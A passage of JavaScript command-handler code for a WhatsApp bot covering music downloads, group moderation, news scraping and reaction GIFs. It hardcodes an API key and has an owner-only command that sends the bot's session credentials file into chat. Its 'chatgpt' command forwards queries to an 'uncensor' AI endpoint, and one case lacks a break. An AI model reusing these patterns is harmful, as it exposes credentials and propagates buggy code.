    console.log(chalk.green(`Private Chat:`));
    console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(body || m.mtype)) +
        "\n" +
        chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n"
    );
}


        switch (command) {
           case 'play': {
    try {
        if (!text) return reply(`*Example : ${prefix + command} migraines by boywithuke*`);

        const axios = require("axios");
        const yts = require("yt-search");

        await ThugBotInc.sendMessage(m.chat, { react: { text: `🎼`, key: m.key } });

        const search = await yts(text);
        const video = search.videos[0];

        if (!video) return reply(`*No results found for: ${text}*`);

        // Notify user that the song is being downloaded
        await reply(`*📥 Downloading ${video.title}... Please wait.*`);

        // Fetch and send the audio
        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data.success) {
            const { download_url, title, thumbnail } = apiResponse.data.result;

            await ThugBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}\n> *Author:* ${video.author.name}`,
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: title,
                        body: `Song by ${video.author.name}`,
                        thumbnailUrl: thumbnail,
                        sourceUrl: video.url,
                        mediaType: 1,
                        renderLargerThumbnail: true,
                    },
                },
            }, { quoted: m });

        } else {
            reply(`*Failed to fetch the song! Please try again later.*`);
        }
    } catch (error) {
        console.error('Error during /play command:', error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}


case 'spotify':{
	if (!text) return reply(`*Please enter a song name*\n*Example : Migraines by boywithuke*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return reply('*Error searching for song*')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return reply('*Error fetching audio*')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return reply('$Error writing audio file*')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await ThugBotInc.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
    }
    break

            case 'ping':
case 'speed': {
    const timestamp = speed();
    const latensi = speed() - timestamp;

    // Send reaction
    await ThugBotInc.sendMessage(m?.chat, { react: { text: `🌩️`, key: m?.key } });

    // Send reply
    reply(`🌩️ *Speed ➯ ${latensi.toFixed(4)}ms︎*`, fstatus);

    break; // Ensure break is present to avoid fall-through
}

            case 'ytsearch': 
case 'yts': {
    try {
        // React to the user's message
        await ThugBotInc.sendMessage(m?.chat, {
            react: { text: `🔎`, key: m?.key },
        });

        // Validate input arguments
        if (!args || args.length < 1) {
            return reply(
                `*Hey ${pushname} , please provide something to search!*\n\n*Example: .ytsearch naruto*`
            );
        }

        // Perform YouTube search
        let res = await yts(args.join(" "));
        let results = res.all;

        // Ensure there are enough results
        if (!results || results.length < 3) {
            return reply(
                `*Sorry ${pushname}, I couldn't find enough results for your query.*`
            );
        }

        // Helper function to fetch and prepare image messages
        const getImageMessage = async (url) => {
            const { imageMessage } = await generateWAMessageContent(
                { image: { url } },
                { upload:  
ThugBotInc.waUploadToServer }
            );
            return imageMessage;
        };

        // Prepare cards for the top 3 results
        const cards = [];
        for (let i = 0; i < 3; i++) {
            const result = results[i];
            const thumbnail = await getImageMessage(result.thumbnail);
            const card = {
                header: {
                    imageMessage: thumbnail,
                    hasMediaAttachment: true,
                },
                body: {
                    text: `*[ RESULT - VID ]*\n\n*Title:* ${result.title}\n*Uploader:* ${result.author.name}\n*URL:* ${result.url}`,
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: `{"display_text":"Watch Video 📺","url":"${result.url}"}`,
                        },
                        {
                            name: "cta_url",
                            buttonParamsJson: `{"display_text":"View Thumbnail 🌟","url":"${result.thumbnail}"}`,
                        },
                    ],
                },
            };
            cards.push(card);
        }

        // Generate and send the carousel message
        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
                                text: `*( 3 BEST SEARCHES )*\n\n*[ 1 ]* ${results[0].title}\n\n*[ 2 ]* ${results[1].title}\n\n*[ 3 ]* ${results[2].title}`,
                            },
                            carouselMessage: {
                                cards,
                                messageVersion: 1,
                            },
                        },
                    },
                },
            },
            {}
        );

        await ThugBotInc.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });
    } catch (error) {
        console.error(error);
        reply(`*Oops! An error occurred while processing your request.*`);
    }
    break;
}
case 'chatgpt': {
    // React with an emoji to the user's message
    await ThugBotInc.sendMessage(m?.chat, { react: { text: '🗨️', key: m?.key } });

    // Check if the user provided a query
    if (!q) {
        return reply(`*Hi ${pushname}, how may I be of service?*\n*You can start by asking me anything.* 🧞`);
    }

    // Indicate that the bot is processing the request
    await loading();

    try {
        // Fetch the response from the chatbot API
        const response = await fetch(`https://apis.davidcyriltech.my.id/ai/uncensor?text=${encodeURIComponent(q)}`);
        
        // Check if the response is successful
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Parse the response as JSON
        const data = await response.json();

        // Ensure the result exists in the response
        if (data && data.result) {
            await reply(data.result);
        } else {
            await reply('*❌ Sorry, I could not process your request. Please try again later.*');
        }
    } catch (error) {
        // Handle any errors that occurred during the fetch operation
        console.error('Fetch error:', error);
        await reply(`*⚠️ An error occurred:* ${error.message}`);
    }
}
break;


            case 'tagall': {
            if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
            if (!m.isGroup) return reply(mess.group)

                let me = m.sender;
                let teks = `       *♱ ${themeemoji} Tag All ${themeemoji} ♱*\n🙊 *Tagger :*  @${me.split('@')[0]}\n🗨️ *Message :* ${args ? args.join(' ') : '*Your attention is needed*'}\n\n${readmore}`;
                for (let mem of participants) {
                    teks += `${themeemoji} @${mem.id.split('@')[0]}\n`;
                }

                ThugBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                });
                break;
            }
            case 'addprem':
                 if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 2)
                    return reply(`*Usage ${prefix + command} @tag time*\n${prefix + command} number time*\n*Example : ${prefix + command} @tag 30d*`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    reply("*User successfully added to premium database*")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    reply("*User successful added to premium database*")
                }
            break
            case 'delprem':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Usage ${prefix + command} @tag*\n*${prefix + command} number*\n\n*Example : ${prefix + command} 234xxxx*`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
                    }
                    reply("*User deleted from premium database*")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
                    reply("*User deleted from premium database*")
                }
            break
            case 'listprem': {
                if (!ThugTheCreator) return reply(mess.owner)
                let data = require('./database/premium.json')
                let txt = `*------「 👑 Premium list 👑 」------*\n\n`
                for (let x of data) {
                    txt += `*Number : ${x.id}*\n`
                    txt += `*Expiratory date : ${x.expired}*\n`
                ThugBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!ThugTheCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Use ${prefix+command} number*\n*Example ${prefix+command} 234xxxx*`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ThugBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`*Ugh, this number isn't registered on whatsapp, Check if the number is correct!*`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`*User ${bnnd} has been added to owner database!*`)
break
case 'delowner':
if (!ThugTheCreator) return reply(mess.owner)
if (!args[0]) return reply(`*Use ${prefix+command} number*\n*Example : ${prefix+command} 234xxxx*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`*User ${ya} has been deleted from owner database!*`)
break
case 'listowner': {
                let teks = '┌──⭓「 *Owner list* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                reply(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!ThugTheCreator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('*Unable to scan directory:* ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `*Detected ${filteredArray.length} junk files*\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("*Deleting junk files*")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("*Successfully removed junk files from session folder* 🧹")
                });
            }
            break
            case 'join':
                try {
                    if (!ThugTheCreator) return reply(mess.owner)
                    if (!text) return reply('*Provide a group link!*')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('*Invalid link!*')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    ThugBotInc.groupAcceptInvite(result)
                    await reply(`*Successfully joined group*`)
                } catch {
                    reply('*Failed to join group*')
                }
                break
            case 'getsession':
                if (!ThugTheCreator) return reply(mess.owner)
                reply('*Please wait, session files are being retrieved*')
                let sesi = fs.readFileSync('./session/creds.json')
                ThugBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!ThugTheCreator) return reply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 *Your current ip address is :* " + ip);
                    })
                })
            break
            case 'autoread':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    reply(`*Successfully changed autoread to ${q}*`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    reply(`*Successfully changed autoread to ${q}*`)
                }
            break
            case 'unavailable':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    reply(`*Successfully changed mode to ${q}*`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    reply(`*Successfully changed mode to ${q}*`)
                }
            break
            case 'autorecordtype':
               if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    reply(`*Successfully changed autorecordtype to ${q}*`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    reply(`*Successfully changed autorecordtype to ${q}*`)
                }
            break
            case 'autorecord':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    reply(`*Successfully changed autorecord to ${q}*`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    reply(`*Successfully changed autorecord to ${q}*`)
                }
            break
            case 'autotype':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    reply(`*Successfully changed mode to ${q}*`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    reply(`*Successfully changed mode to ${q}*`)
                }
            break
            case 'autobio':
                if (!ThugTheCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`*Example ${prefix + command} On/Off?*`)
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    reply(`*Successfully changed autobio to ${q}*`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    reply(`*Successfully changed autobio to ${q}*`)
                }
            break
            case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

   var pat = await fetchJson(`https://api.waifu.pics/sfw/${command}`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `*@${m.sender.split("@")[0]} ${command} themselves!*`

          } else {

           musers = `*@${m.sender.split("@")[0]} ${command} @${users.split("@")[0]}* `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          ThugBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
           case 'kick':
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return replybotadmin(mess.botadmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ThugBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                reply(`*Group participant kicked successfully* 🎉`)
                break 
                case 'add':
              if (!m.isGroup) return reply(mess.group)
                if (!ThugTheCreator) return reply(mess.owner)
                if (!isBotAdmins) return reply(mess.botadmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ThugBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                reply('*User added successfully*')
                break
            case 'remini': {
    if (!quoted) return reply("*Where is the picture?*");
    if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`);
    
    await loading();  // Ensure this function properly handles loading
    
    try {
        const { remini } = require('./lib/remini');
        let media = await quoted.download();
        let processedImage = await remini(media, "enhance");
        
        ThugBotInc.sendMessage(m.chat, { 
            image: processedImage, 
            caption: `*© 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*`
        }, { quoted: m });
    } catch (error) {
        console.error("Error in processing image:", error);
        reply("*An error occurred while processing the image.*");
    }
}

      case 'movie':
if (!text) return reply(`_Name a Series or movie`)
await loading() 
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB MOVIE SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬 *Title*      : " + fids.data.Title + "\n"
            imdbt += "📅 *Year*       : " + fids.data.Year + "\n"
            imdbt += "⭐ *Rated*      : " + fids.data.Rated + "\n"
            imdbt += "📆 *Released*   : " + fids.data.Released + "\n"
            imdbt += "⏳ *Runtime*    : " + fids.data.Runtime + "\n"
            imdbt += "🌀 *Genre*      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻 *Director*   : " + fids.data.Director + "\n"
            imdbt += "✍ *Writer*     : " + fids.data.Writer + "\n"
            imdbt += "👨 *Actors*     : " + fids.data.Actors + "\n"
            imdbt += "📃 *Plot*       : " + fids.data.Plot + "\n"
            imdbt += "🌐c*Language*   : " + fids.data.Language + "\n"
            imdbt += "🌍 *Country*    : " + fids.data.Country + "\n"
            imdbt += "🎖️*Awards*     : " + fids.data.Awards + "\n"
            imdbt += "📦*BoxOffice*  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️ *Production* : " + fids.data.Production + "\n"
            imdbt += "🌟 *imdbRating* : " + fids.data.imdbRating + "\n"
            imdbt += "✅ *imdbVotes*  : " + fids.data.imdbVotes + ""
           ThugBotInc.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break

       case 'telestick': {
	if (!m.isGroup) return reply(mess.privates)
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await reply(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await reply('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				ThugBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				ThugBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break     
     case 'pair-code': {
    if (!isPremium) return replyprem(mess.premium);
    if (!ThugTheCreator) return reply(mess.owner);
    if (!text) return reply(`*Example: ${prefix + command} 234xxxx*`);

    await jadibot(ThugBotInc, text, m, frommeky);

    const furry = "`";
    const pairingCodeMessage = `*Follow the steps below*\n\n*1. Click the three dots at the top right corner of your WhatsApp home page*\n*2. Tap on "linked device"*\n*3. Tap on "link a device"*\n*4. Tap on "Use mobile data"*\n*5. Tap on "Link with phone number instead"*\n*6. Enter the code below*\n*Note: Code can expire at any time!*\n\n👨‍💻*Code:* ${furry}${global.codepairing}${furry}\n\n*If the code error, please delete the session2 folder located inside the lib folder in your panel*\n\n*⚠️ NOTE: ⚠️*\n*This is a one time feature, using it nore than once can cause bot errors, and if such error occurs or you want to pair another device, delete the "SESSION 2" folder located inside the lib folder*`;

    reply(pairingCodeMessage);

    setTimeout(() => {
        reply('*Pairing code retrieved successfully!*\n*Waiting for user to pair....*');
        console.log('Jadibot •••');
    }, 1200);

    break;
}
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `*News: ${i.berita}*\n`
iwannnn += `*Upload: ${i.berita_diupload}*\n`
iwannnn += `*Link: ${i.berita_url}*\n`
}
iwannnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
break
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `*News: ${i.berita}*\n`
iwannnnn += `*Upload: ${i.berita_diupload}*\n`
iwannnnn += `*Type: ${i.berita_jenis}*\n`
iwannnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
break
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `*News: ${i.berita}*\n`
iwannnnnnn += `*Upload: ${i.berita_diupload}*\n`
iwannnnnnn += `*Type: ${i.berita_jenis}*\n`
iwannnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
break
//=================================================//
case 'Secondnews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnn += `*Upload: ${i.berita_diupload}*\n`
iwannnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
break
//=================================================//
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnnnnn += `*Upload: ${i.berita_diupload}*\n`
iwannnnnnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnnnnnn += `*Jenis: ${i.berita_jenis}*\n`
iwannnnnnnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
break
//=================================================//

//=================================================//
case 'antara':


AntaraNews().then(async(res) => {
no = 0
iwannnnnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnn += `*type: ${i.berita_jenis}*\n`
iwannnnnnnnnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnnnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnn }, { quoted:m })
})
break
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `*News: ${i.berita}*\n`
iwannnnnnnnnnnnnnn += `*Type: ${i.berita_jenis}*\n`
iwannnnnnnnnnnnnnn += `*Upload: ${i.berita_diupload}*\n`
iwannnnnnnnnnnnnnn += `*Link: ${i.berita_url}*\n`
}
iwannnnnnnnnnnnnnn += ""
ThugBotInc.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
break  
   case 'cnn':


CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `*News: ${i.berita}*\n`
iwann += `*Link: ${i.berita_url}*\n`
}
iwann += ""
reply(iwann) 
})
break         
     case 'creategc': case 'creategroup': {
if (!ThugTheCreator) return reply(mess.owner)
if (!text) return reply(`*Use ${prefix+command} groupname*`)
try {
let cret = await ThugBotInc.groupCreate(args.join(" "), [])
let response = await ThugBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
ThugBotInc.sendMessage(m.chat, { text:teksop, mentions: await ThugBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	reply(`*Error*`)
	}
}
break
case 'promote':
           if (!m.isGroup) return reply(mess.group)
           if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ThugBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                reply(mess.success)
                break
            case 'demote':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ThugBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                reply(mess.success)
                break
            case 'setnamegc':
            case 'setgcname':
            case 'setsubject':
            if (!m.isGroup) return reply(mess.group)
            if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                if (!text) return reply('*Provide a group name*')
                await ThugBotInc.groupUpdateSubject(m.chat, text)
                reply(mess.success)
                break       
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
